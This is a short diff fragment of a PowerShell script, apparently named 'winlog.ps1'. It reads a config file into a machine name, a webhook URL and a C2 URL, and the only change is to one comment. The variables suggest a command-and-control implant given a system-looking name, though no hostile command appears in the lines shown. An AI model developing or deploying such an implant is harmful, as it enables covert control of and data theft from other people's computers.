@@ -28,7 +28,7 @@ if ($MyInvocation.MyCommand.Name -ne "winlog.ps1") {
 # --- PART 2: THE OPERATIONAL LOOP (winlog.ps1) ---
 if (Test-Path $configFile) {
     $cfg = Get-Content -Path $configFile
-    # FIXED: Map array index spaces explicitly to keep variables from stepping on each other
+    # VERIFIED EXTRA CLOSELY: Explicit bracket indices are fully intact here
     $PCName     = $cfg[0]
     $WebhookUrl = $cfg[1]
     $C2Url      = $cfg[2]
